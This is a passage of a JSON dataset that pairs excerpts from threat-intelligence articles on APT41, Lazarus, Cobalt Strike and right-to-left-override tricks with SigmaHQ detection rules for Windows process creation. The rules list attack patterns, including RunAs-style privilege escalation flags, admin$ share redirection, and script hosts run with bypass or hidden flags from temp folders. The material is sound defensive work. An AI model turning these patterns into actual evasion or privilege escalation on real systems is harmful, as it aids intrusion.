    "markdown": "# Post Mar 20, 2022 NotepadExec - Using notepad.exe to launch an EXE without code injection (useless and unreliable but why not? 🙂) https://x86matthew.com/view_post?id=notepadexec ```image Description: The image depicts a Windows PowerShell terminal showing a command execution process using NotepadExec to launch a malicious executable file. The command line displays the invocation of 'NotepadExec.exe' with a specified path to 'a_malicious_exe.exe'. Below that, a message indicates that Notepad was successfully launched with the malicious executable. The lower section of the image shows a process list, indicating the running processes such as 'notepad.exe', 'a_malicious_exe.exe', and 'conhost.exe', along with their CPU usage statistics.",
    "sigma_rule": {
      "title": "Suspicious Process Parents",
      "id": "cbec226f-63d9-4eca-9f52-dfb6652f24df",
      "status": "test",
      "description": "Detects suspicious parent processes that should not have any children or should only have a single possible child program",
      "references": [
        "https://web.archive.org/web/20220731153253/https://twitter.com/x86matthew/status/1505476263464607744",
        "https://svch0st.medium.com/stats-from-hunting-cobalt-strike-beacons-c17e56255f9b"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-03-21",
      "modified": "2022-09-08",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": [
            "\\minesweeper.exe",
            "\\winver.exe",
            "\\bitsadmin.exe"
          ]
        },
        "selection_special": {
          "ParentImage|endswith": [
            "\\csrss.exe",
            "\\certutil.exe",
            "\\eventvwr.exe",
            "\\calc.exe",
            "\\notepad.exe"
          ]
        },
        "filter_special": {
          "Image|endswith": [
            "\\WerFault.exe",
            "\\wermgr.exe",
            "\\conhost.exe",
            "\\mmc.exe",
            "\\win32calc.exe",
            "\\notepad.exe"
          ]
        },
        "filter_null": {
          "Image": null
        },
        "condition": "selection or ( selection_special and not 1 of filter_* )"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_parents.yml"
  },
  "554": {
    "url": "https://svch0st.medium.com/stats-from-hunting-cobalt-strike-beacons-c17e56255f9b",
    "markdown": "# Stats from Hunting Cobalt Strike Beacons ## Some Statistics on Cobalt Strike Configs in April and May 2021 Collected from over 1000 configurations, here are some high-level statistics that demonstrate some of the common trends among one of the most popular tools in an adversary’s arsenal. These configs were collected from live servers around early May 2021. If you are interested in how the data was collected, scroll to the bottom of the article. **_Also if you just want the raw data here is a_** **_link_**. If you want to read more about how the configurations are structured in",
    "sigma_rule": {
      "title": "Suspicious Process Parents",
      "id": "cbec226f-63d9-4eca-9f52-dfb6652f24df",
      "status": "test",
      "description": "Detects suspicious parent processes that should not have any children or should only have a single possible child program",
      "references": [
        "https://web.archive.org/web/20220731153253/https://twitter.com/x86matthew/status/1505476263464607744",
        "https://svch0st.medium.com/stats-from-hunting-cobalt-strike-beacons-c17e56255f9b"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-03-21",
      "modified": "2022-09-08",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": [
            "\\minesweeper.exe",
            "\\winver.exe",
            "\\bitsadmin.exe"
          ]
        },
        "selection_special": {
          "ParentImage|endswith": [
            "\\csrss.exe",
            "\\certutil.exe",
            "\\eventvwr.exe",
            "\\calc.exe",
            "\\notepad.exe"
          ]
        },
        "filter_special": {
          "Image|endswith": [
            "\\WerFault.exe",
            "\\wermgr.exe",
            "\\conhost.exe",
            "\\mmc.exe",
            "\\win32calc.exe",
            "\\notepad.exe"
          ]
        },
        "filter_null": {
          "Image": null
        },
        "condition": "selection or ( selection_special and not 1 of filter_* )"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_parents.yml"
  },
  "555": {
    "url": "https://www.trendmicro.com/en_us/research/22/k/hack-the-real-box-apt41-new-subgroup-earth-longzhi.html",
    "markdown": "# Hack the Real Box: APT41’s New Subgroup Earth Longzhi **APT & Targeted Attacks** November 09, 2022 We looked into the campaigns deployed by a new subgroup of advanced persistent threat (APT) group APT41, Earth Longzhi. This entry breaks down the technical details of the campaigns in full as presented at HITCON PEACE 2022 in August. --- ## Campaign overview In early 2022, we investigated an incident that compromised a company in Taiwan. The malware used in the incident was a simple but custom Cobalt Strike loader. After further investigation, however, we found incidents targeting multiple regions using a similar",
    "sigma_rule": {
      "title": "Suspicious RunAs-Like Flag Combination",
      "id": "50d66fb0-03f8-4da0-8add-84e77d12a020",
      "status": "test",
      "description": "Detects suspicious command line flags that let the user set a target user and command as e.g. seen in PsExec-like tools",
      "references": [
        "https://www.trendmicro.com/en_us/research/22/k/hack-the-real-box-apt41-new-subgroup-earth-longzhi.html"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-11-11",
      "tags": [
        "attack.privilege-escalation"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_user": {
          "CommandLine|contains": [
            " -u system ",
            " --user system ",
            " -u NT",
            " -u \"NT",
            " -u 'NT",
            " --system ",
            " -u administrator "
          ]
        },
        "selection_command": {
          "CommandLine|contains": [
            " -c cmd",
            " -c \"cmd",
            " -c powershell",
            " -c \"powershell",
            " --command cmd",
            " --command powershell",
            " -c whoami",
            " -c wscript",
            " -c cscript"
          ]
        },
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_privilege_escalation_cli_patterns.yml"
  },
  "556": {
    "url": "https://web.archive.org/web/20180718061628/https://securitybytes.io/blue-team-fundamentals-part-two-windows-processes-759fe15965e2",
    "markdown": "# Blue Team Fundamentals Part Two: Windows Processes In part one I touched on logging and the importance of working with what you have already got, rather than trying to reinvent the wheel. There is no point adding more logs if you’re not looking at what is already there. The same can be said for what a vast amount of businesses have in one form or another, Microsoft Windows. There is a lot of information to be gleaned from Windows processes. The thing with processes is that there are a lot of them, and it can seem massively overwhelming. However,",
    "sigma_rule": {
      "title": "Windows Processes Suspicious Parent Directory",
      "id": "96036718-71cc-4027-a538-d1587e0006a7",
      "status": "test",
      "description": "Detect suspicious parent processes of well-known Windows processes",
      "references": [
        "https://web.archive.org/web/20180718061628/https://securitybytes.io/blue-team-fundamentals-part-two-windows-processes-759fe15965e2",
        "https://www.carbonblack.com/2014/06/10/screenshot-demo-hunt-evil-faster-than-ever-with-carbon-black/",
        "https://www.13cubed.com/downloads/windows_process_genealogy_v2.pdf"
      ],
      "author": "vburov",
      "date": "2019-02-23",
      "modified": "2025-03-06",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.003",
        "attack.t1036.005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\svchost.exe",
            "\\taskhost.exe",
            "\\lsm.exe",
            "\\lsass.exe",
            "\\services.exe",
            "\\lsaiso.exe",
            "\\csrss.exe",
            "\\wininit.exe",
            "\\winlogon.exe"
          ]
        },
        "filter_sys": [
          {
            "ParentImage|endswith": [
              "\\SavService.exe",
              "\\ngen.exe"
            ]
          },
          {
            "ParentImage|contains": [
              "\\System32\\",
              "\\SysWOW64\\"
            ]
          }
        ],
        "filter_msmpeng": {
          "ParentImage|contains": [
            "\\Windows Defender\\",
            "\\Microsoft Security Client\\"
          ],
          "ParentImage|endswith": "\\MsMpEng.exe"
        },
        "filter_null": [
          {
            "ParentImage": null
          },
          {
            "ParentImage": [
              "",
              "-"
            ]
          }
        ],
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Some security products seem to spawn these"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_proc_wrong_parent.yml"
  },
  "557": {
    "url": "https://www.carbonblack.com/2014/06/10/screenshot-demo-hunt-evil-faster-than-ever-with-carbon-black/",
    "markdown": "",
    "sigma_rule": {
      "title": "Windows Processes Suspicious Parent Directory",
      "id": "96036718-71cc-4027-a538-d1587e0006a7",
      "status": "test",
      "description": "Detect suspicious parent processes of well-known Windows processes",
      "references": [
        "https://web.archive.org/web/20180718061628/https://securitybytes.io/blue-team-fundamentals-part-two-windows-processes-759fe15965e2",
        "https://www.carbonblack.com/2014/06/10/screenshot-demo-hunt-evil-faster-than-ever-with-carbon-black/",
        "https://www.13cubed.com/downloads/windows_process_genealogy_v2.pdf"
      ],
      "author": "vburov",
      "date": "2019-02-23",
      "modified": "2025-03-06",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.003",
        "attack.t1036.005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\svchost.exe",
            "\\taskhost.exe",
            "\\lsm.exe",
            "\\lsass.exe",
            "\\services.exe",
            "\\lsaiso.exe",
            "\\csrss.exe",
            "\\wininit.exe",
            "\\winlogon.exe"
          ]
        },
        "filter_sys": [
          {
            "ParentImage|endswith": [
              "\\SavService.exe",
              "\\ngen.exe"
            ]
          },
          {
            "ParentImage|contains": [
              "\\System32\\",
              "\\SysWOW64\\"
            ]
          }
        ],
        "filter_msmpeng": {
          "ParentImage|contains": [
            "\\Windows Defender\\",
            "\\Microsoft Security Client\\"
          ],
          "ParentImage|endswith": "\\MsMpEng.exe"
        },
        "filter_null": [
          {
            "ParentImage": null
          },
          {
            "ParentImage": [
              "",
              "-"
            ]
          }
        ],
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Some security products seem to spawn these"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_proc_wrong_parent.yml"
  },
  "558": {
    "url": "https://www.13cubed.com/downloads/windows_process_genealogy_v2.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Windows Processes Suspicious Parent Directory",
      "id": "96036718-71cc-4027-a538-d1587e0006a7",
      "status": "test",
      "description": "Detect suspicious parent processes of well-known Windows processes",
      "references": [
        "https://web.archive.org/web/20180718061628/https://securitybytes.io/blue-team-fundamentals-part-two-windows-processes-759fe15965e2",
        "https://www.carbonblack.com/2014/06/10/screenshot-demo-hunt-evil-faster-than-ever-with-carbon-black/",
        "https://www.13cubed.com/downloads/windows_process_genealogy_v2.pdf"
      ],
      "author": "vburov",
      "date": "2019-02-23",
      "modified": "2025-03-06",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.003",
        "attack.t1036.005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\svchost.exe",
            "\\taskhost.exe",
            "\\lsm.exe",
            "\\lsass.exe",
            "\\services.exe",
            "\\lsaiso.exe",
            "\\csrss.exe",
            "\\wininit.exe",
            "\\winlogon.exe"
          ]
        },
        "filter_sys": [
          {
            "ParentImage|endswith": [
              "\\SavService.exe",
              "\\ngen.exe"
            ]
          },
          {
            "ParentImage|contains": [
              "\\System32\\",
              "\\SysWOW64\\"
            ]
          }
        ],
        "filter_msmpeng": {
          "ParentImage|contains": [
            "\\Windows Defender\\",
            "\\Microsoft Security Client\\"
          ],
          "ParentImage|endswith": "\\MsMpEng.exe"
        },
        "filter_null": [
          {
            "ParentImage": null
          },
          {
            "ParentImage": [
              "",
              "-"
            ]
          }
        ],
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Some security products seem to spawn these"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_proc_wrong_parent.yml"
  },
  "559": {
    "url": "https://www.mandiant.com/resources/blog/infected-usb-steal-secrets",
    "markdown": "# The Spies Who Loved You: Infected USB Drives to Steal Secrets **Posted on:** July 11, 2023 **Tags:** Threat Intelligence --- ## Introduction In the first half of 2023, Mandiant has observed a threefold increase in the number of attacks using infected USB drives to steal secrets. Mandiant tracked all of the cases and found that the majority of the incidents could be attributed to several active USB-based operation campaigns affecting both the public and private sectors globally. Previously, we covered one of the campaigns that leverages USB flash drives as an initial infection vector and concentrates on the Philippines.",
    "sigma_rule": {
      "title": "Suspicious Process Execution From Fake Recycle.Bin Folder",
      "id": "5ce0f04e-3efc-42af-839d-5b3a543b76c0",
      "related": [
        {
          "id": "cd8b36ac-8e4a-4c2f-a402-a29b8fbd5bca",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects process execution from a fake recycle bin folder, often used to avoid security solution.",
      "references": [
        "https://www.mandiant.com/resources/blog/infected-usb-steal-secrets",
        "https://unit42.paloaltonetworks.com/cloaked-ursa-phishing/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-07-12",
      "modified": "2023-12-11",
      "tags": [
        "attack.persistence",
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|contains": [
            "RECYCLERS.BIN\\",
            "RECYCLER.BIN\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_recycle_bin_fake_execution.yml"
  },
  "560": {
    "url": "https://unit42.paloaltonetworks.com/cloaked-ursa-phishing/",
    "markdown": "# Diplomats Beware: Cloaked Ursa Phishing With a Twist ## Executive Summary Russia’s Foreign Intelligence Service hackers, which we call Cloaked Ursa (aka APT29, UAC-0004, Midnight Blizzard/Nobelium, Cozy Bear) are well known for targeting diplomatic missions globally. Their initial access attempts over the past two years have predominantly used phishing lures with a theme of diplomatic operations such as the following: - *Notes verbale* (semiformal government-to-government diplomatic communications) - Embassies’ operating status updates - Schedules for diplomats - Invitations to embassy events These types of lures are generally sent to individuals who handle this type of embassy correspondence as part",
    "sigma_rule": {
      "title": "Suspicious Process Execution From Fake Recycle.Bin Folder",
      "id": "5ce0f04e-3efc-42af-839d-5b3a543b76c0",
      "related": [
        {
          "id": "cd8b36ac-8e4a-4c2f-a402-a29b8fbd5bca",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects process execution from a fake recycle bin folder, often used to avoid security solution.",
      "references": [
        "https://www.mandiant.com/resources/blog/infected-usb-steal-secrets",
        "https://unit42.paloaltonetworks.com/cloaked-ursa-phishing/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-07-12",
      "modified": "2023-12-11",
      "tags": [
        "attack.persistence",
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|contains": [
            "RECYCLERS.BIN\\",
            "RECYCLER.BIN\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_recycle_bin_fake_execution.yml"
  },
  "561": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/",
    "markdown": "# Destructive malware targeting Ukrainian organizations **By** Microsoft Digital Security Unit (DSU), Microsoft Incident Response, Microsoft Threat Intelligence **January 15, 2022** ## June 2023 update For more information about Cadet Blizzard’s tooling, victimology, and motivation, read this blog: **Cadet Blizzard emerges as a novel and distinct Russian threat actor | Microsoft Security Blog** ## April 2023 update Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. **DEV-0586** is now tracked as **Cadet Blizzard**. --- Microsoft Threat Intelligence Center (MSTIC) has identified evidence of a destructive malware operation targeting multiple organizations in",
    "sigma_rule": {
      "title": "Suspicious Redirection to Local Admin Share",
      "id": "ab9e3b40-0c85-4ba1-aede-455d226fd124",
      "status": "test",
      "description": "Detects a suspicious output redirection to the local admins share, this technique is often found in malicious scripts or hacktool stagers",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/",
        "https://blog.talosintelligence.com/lazarus-three-rats/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-01-16",
      "modified": "2023-12-28",
      "tags": [
        "attack.exfiltration",
        "attack.t1048"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_redirect": {
          "CommandLine|contains": ">"
        },
        "selection_share": {
          "CommandLine|contains": [
            "\\\\\\\\127.0.0.1\\\\admin$\\\\",
            "\\\\\\\\localhost\\\\admin$\\\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_redirect_local_admin_share.yml"
  },
  "562": {
    "url": "https://blog.talosintelligence.com/lazarus-three-rats/",
    "markdown": "# Lazarus and the tale of three RATs **Thursday, September 8, 2022 08:01** Threat Spotlight - Cisco Talos has been tracking a new campaign operated by the Lazarus APT group, attributed to North Korea by the United States government. - This campaign involved the exploitation of vulnerabilities in VMWare Horizon to gain an initial foothold into targeted organizations. - Targeted organizations include energy providers from around the world, including those headquartered in the United States, Canada, and Japan. - The campaign is meant to infiltrate organizations around the world for establishing long-term access and subsequently exfiltrating data of interest to",
    "sigma_rule": {
      "title": "Suspicious Redirection to Local Admin Share",
      "id": "ab9e3b40-0c85-4ba1-aede-455d226fd124",
      "status": "test",
      "description": "Detects a suspicious output redirection to the local admins share, this technique is often found in malicious scripts or hacktool stagers",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/",
        "https://blog.talosintelligence.com/lazarus-three-rats/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-01-16",
      "modified": "2023-12-28",
      "tags": [
        "attack.exfiltration",
        "attack.t1048"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_redirect": {
          "CommandLine|contains": ">"
        },
        "selection_share": {
          "CommandLine|contains": [
            "\\\\\\\\127.0.0.1\\\\admin$\\\\",
            "\\\\\\\\localhost\\\\admin$\\\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_redirect_local_admin_share.yml"
  },
  "563": {
    "url": "https://redcanary.com/blog/right-to-left-override/",
    "markdown": "# “semaG dna nuF” with Right-to-Left Override Unicode Characters Originally published September 13, 2017. Last modified April 30, 2024. --- *Our Security Operations team loves to share insights on TTPs when we see them in the wild. Today we’re focusing on an oldie but a goodie: right-to-left override attacks.* ## First, a Refresher on Right-to-Left (RLO) Overrides. Unicode contains several characters designed to allow right to left (RTL) characters to be inserted inside text that is normally left to right. One of these is the “RIGHT-TO-LEFT OVERRIDE” character, U+202E. For example, we can write a normal (left to right) sentence",
    "sigma_rule": {
      "title": "Potential Defense Evasion Via Right-to-Left Override",
      "id": "ad691d92-15f2-4181-9aa4-723c74f9ddc3",
      "related": [
        {
          "id": "e0552b19-5a83-4222-b141-b36184bb8d79",
          "type": "derived"
        },
        {
          "id": "584bca0f-3608-4402-80fd-4075ff6072e3",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the presence of the \"u202+E\" character, which causes a terminal, browser, or operating system to render text in a right-to-left sequence.\nThis is used as an obfuscation and masquerading techniques.\n",
      "references": [
        "https://redcanary.com/blog/right-to-left-override/",
        "https://www.malwarebytes.com/blog/news/2014/01/the-rtlo-method",
        "https://unicode-explorer.com/c/202E"
      ],
      "author": "Micah Babinski, @micahbabinski",
      "date": "2023-02-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": "‮"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Commandlines that contains scriptures such as arabic or hebrew might make use of this character"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_right_to_left_override.yml"
  },
  "564": {
    "url": "https://www.malwarebytes.com/blog/news/2014/01/the-rtlo-method",
    "markdown": "# The RTLO method **Posted:** January 9, 2014 After my post about extensions, I received some requests to deal with another method of pretending to be a different type of file. If you have not read that article yet, it will prove helpful to do that first in order to better understand this post. ### What is RTLO (aka RLO)? The method called RTLO, or RLO, uses the method built into Windows to deal with languages that are written from right to left, the “Right to left override”. Let’s say you want to use a right-to-left written language, like Hebrew",
    "sigma_rule": {
      "title": "Potential Defense Evasion Via Right-to-Left Override",
      "id": "ad691d92-15f2-4181-9aa4-723c74f9ddc3",
      "related": [
        {
          "id": "e0552b19-5a83-4222-b141-b36184bb8d79",
          "type": "derived"
        },
        {
          "id": "584bca0f-3608-4402-80fd-4075ff6072e3",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the presence of the \"u202+E\" character, which causes a terminal, browser, or operating system to render text in a right-to-left sequence.\nThis is used as an obfuscation and masquerading techniques.\n",
      "references": [
        "https://redcanary.com/blog/right-to-left-override/",
        "https://www.malwarebytes.com/blog/news/2014/01/the-rtlo-method",
        "https://unicode-explorer.com/c/202E"
      ],
      "author": "Micah Babinski, @micahbabinski",
      "date": "2023-02-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": "‮"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Commandlines that contains scriptures such as arabic or hebrew might make use of this character"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_right_to_left_override.yml"
  },
  "565": {
    "url": "https://unicode-explorer.com/c/202E",
    "markdown": "# U+202E RIGHT-TO-LEFT OVERRIDE ## Codepoint U+202E ## Comments commonly abbreviated RLO ## Block General Punctuation ## Sub-Block Format characters ## Category Cf / Other, format ## Description The Right-To-Left Override character can be used to force a right-to-left direction within a text. This is often abused by hackers to disguise file extensions: when using it in the file name `my-text.'U+202E'cod.exe`, the file name is actually displayed as `my-text.exe.doc` - so it seems to be a `.doc` file while in reality it is an `.exe` file. There's even an xkcd comic for this character! ## Links - Article: XKCD Comics",
    "sigma_rule": {
      "title": "Potential Defense Evasion Via Right-to-Left Override",
      "id": "ad691d92-15f2-4181-9aa4-723c74f9ddc3",
      "related": [
        {
          "id": "e0552b19-5a83-4222-b141-b36184bb8d79",
          "type": "derived"
        },
        {
          "id": "584bca0f-3608-4402-80fd-4075ff6072e3",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the presence of the \"u202+E\" character, which causes a terminal, browser, or operating system to render text in a right-to-left sequence.\nThis is used as an obfuscation and masquerading techniques.\n",
      "references": [
        "https://redcanary.com/blog/right-to-left-override/",
        "https://www.malwarebytes.com/blog/news/2014/01/the-rtlo-method",
        "https://unicode-explorer.com/c/202E"
      ],
      "author": "Micah Babinski, @micahbabinski",
      "date": "2023-02-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": "‮"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Commandlines that contains scriptures such as arabic or hebrew might make use of this character"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_right_to_left_override.yml"
  },
  "566": {
    "url": "https://www.virustotal.com/gui/file/91ba814a86ddedc7a9d546e26f912c541205b47a853d227756ab1334ade92c3f",
    "markdown": "",
    "sigma_rule": {
      "title": "Script Interpreter Execution From Suspicious Folder",
      "id": "1228c958-e64e-4e71-92ad-7d429f4138ba",
      "status": "test",
      "description": "Detects a suspicious script execution in temporary folders or folders accessible by environment variables",
      "references": [
        "https://www.virustotal.com/gui/file/91ba814a86ddedc7a9d546e26f912c541205b47a853d227756ab1334ade92c3f",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-russia-ukraine-military",
        "https://learn.microsoft.com/en-us/windows/win32/shell/csidl"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-02-08",
      "modified": "2023-06-16",
      "tags": [
        "attack.execution",
        "attack.t1059"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_proc_image": {
          "Image|endswith": [
            "\\cscript.exe",
            "\\mshta.exe",
            "\\wscript.exe"
          ]
        },
        "selection_proc_flags": {
          "CommandLine|contains": [
            " -ep bypass ",
            " -ExecutionPolicy bypass ",
            " -w hidden ",
            "/e:javascript ",
            "/e:Jscript ",
            "/e:vbscript "
          ]
        },
        "selection_proc_original": {
          "OriginalFileName": [
            "cscript.exe",
            "mshta.exe",
            "wscript.exe"
          ]
        },
        "selection_folders_1": {
          "CommandLine|contains": [
            ":\\Perflogs\\",
            ":\\Users\\Public\\",
            "\\AppData\\Local\\Temp",
            "\\AppData\\Roaming\\Temp",
            "\\Temporary Internet",
            "\\Windows\\Temp"
          ]
        },
        "selection_folders_2": [
          {
            "CommandLine|contains|all": [
              ":\\Users\\",
              "\\Favorites\\"
            ]
          },
          {
            "CommandLine|contains|all": [
              ":\\Users\\",
              "\\Favourites\\"
            ]
          },
          {
            "CommandLine|contains|all": [
              ":\\Users\\",
              "\\Contacts\\"
            ]
          }
        ],
        "condition": "1 of selection_proc_* and 1 of selection_folders_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_script_exec_from_env_folder.yml"
  },
  "567": {
    "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-russia-ukraine-military",
    "markdown": "# Shuckworm: Inside Russia’s Relentless Cyber Campaign Against Ukraine **Attackers heavily focused on acquiring military and security intelligence in order to support invading forces.** Posted: 15 Jun, 2023 --- The Shuckworm espionage group is continuing to mount multiple cyber attacks against Ukraine, with recent targets including security services, military, and government organizations. In some cases, Shuckworm has succeeded in staging long-running intrusions, lasting for as long as three months. The attackers repeatedly attempted to access and steal sensitive information such as reports about the deaths of Ukrainian military service members, enemy engagements and air strikes, arsenal inventories, military training, and",
    "sigma_rule": {
      "title": "Script Interpreter Execution From Suspicious Folder",
      "id": "1228c958-e64e-4e71-92ad-7d429f4138ba",
      "status": "test",
      "description": "Detects a suspicious script execution in temporary folders or folders accessible by environment variables",
      "references": [
        "https://www.virustotal.com/gui/file/91ba814a86ddedc7a9d546e26f912c541205b47a853d227756ab1334ade92c3f",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-russia-ukraine-military",
        "https://learn.microsoft.com/en-us/windows/win32/shell/csidl"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-02-08",
      "modified": "2023-06-16",
      "tags": [
        "attack.execution",
        "attack.t1059"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_proc_image": {
          "Image|endswith": [
            "\\cscript.exe",
            "\\mshta.exe",
            "\\wscript.exe"
          ]
        },
        "selection_proc_flags": {
          "CommandLine|contains": [
            " -ep bypass ",
            " -ExecutionPolicy bypass ",
            " -w hidden ",
            "/e:javascript ",
            "/e:Jscript ",
            "/e:vbscript "
          ]
        },
        "selection_proc_original": {
          "OriginalFileName": [
            "cscript.exe",
            "mshta.exe",
            "wscript.exe"
          ]
        },
        "selection_folders_1": {
          "CommandLine|contains": [
            ":\\Perflogs\\",
            ":\\Users\\Public\\",
            "\\AppData\\Local\\Temp",
            "\\AppData\\Roaming\\Temp",
            "\\Temporary Internet",
            "\\Windows\\Temp"
          ]
        },
        "selection_folders_2": [
          {
            "CommandLine|contains|all": [
              ":\\Users\\",
              "\\Favorites\\"
            ]
          },
          {
            "CommandLine|contains|all": [
              ":\\Users\\",
              "\\Favourites\\"
            ]
          },
          {
            "CommandLine|contains|all": [
              ":\\Users\\",
              "\\Contacts\\"
            ]
          }
        ],
        "condition": "1 of selection_proc_* and 1 of selection_folders_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_script_exec_from_env_folder.yml"
  },
  "568": {
    "url": "https://learn.microsoft.com/en-us/windows/win32/shell/csidl",
    "markdown": "# CSIDL As of Windows Vista, these values have been replaced by **KNOWNFOLDERID** values. See that topic for a list of the new constants and their corresponding CSIDL values. For convenience, corresponding **KNOWNFOLDERID** values are also noted here for each CSIDL value. The CSIDL system is supported under Windows Vista for compatibility reasons. However, new development should use **KNOWNFOLDERID** values rather than CSIDL values. CSIDL (constant special item ID list) values provide a unique system-independent way to identify special folders used frequently by applications, but which may not have the same name or location on any given system. For example,",
    "sigma_rule": {
      "title": "Script Interpreter Execution From Suspicious Folder",
      "id": "1228c958-e64e-4e71-92ad-7d429f4138ba",
      "status": "test",
      "description": "Detects a suspicious script execution in temporary folders or folders accessible by environment variables",
      "references": [
        "https://www.virustotal.com/gui/file/91ba814a86ddedc7a9d546e26f912c541205b47a853d227756ab1334ade92c3f",
